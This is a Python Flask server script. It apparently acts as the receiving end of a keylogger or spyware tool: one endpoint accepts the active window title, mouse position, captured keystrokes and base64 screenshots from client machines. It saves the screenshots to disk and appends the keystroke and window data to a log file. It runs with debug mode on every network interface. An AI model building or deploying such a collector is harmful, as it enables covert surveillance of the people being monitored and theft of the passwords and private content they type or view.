from flask import Flask, request
import base64
import io
from PIL import Image
from datetime import datetime
import os
app = Flask(__name__)

@app.route("/info", methods=["POST"])
def info():
    try:
        if request.method == "POST":
            active_window = request.form.get("active_window")
            mouse_position = request.form.get("mouse_position")
            timestamp = request.form.get("timestamp")
            key_info = request.form.get("key_info")
            base64_image = request.form.get("image_data")
            os.makedirs("screenshot", exist_ok=True)

            if base64_image is not None:
                # Decode the Base64-encoded image
                image_data = base64.b64decode(base64_image)
                # Create a PIL Image from the image data
                image = Image.open(io.BytesIO(image_data))
                datetime_obj = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
                filename = datetime_obj.strftime("%Y%m%d%H%M%S")
                try:image.save(f"./screenshot/{filename}.png")
                except Exception as e: print(e)
            else:pass

            # screenshot = request.files["screenshot"]
            # # Process the received information and screenshot as needed
            # # For example, you can save the screenshot to a file
            # screenshot.save("received_screenshot.png")

            log_line =f"ts : {timestamp} | aw : {active_window} | mp : {mouse_position} | ki : {key_info}\n"

            with open("log.txt", "a") as f:
                f.write(log_line)
                
            # Process the received information as needed
            print("Received data:")
            print("Active Window:", active_window)
            print("Mouse Position:", mouse_position)
            print("Timestamp:", timestamp)
            print("Key Info:", key_info)
            # print("Image_data",base64_image)

        return 'Success',200
    
    except Exception as e:
        print(e)
        return 'Fail',500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
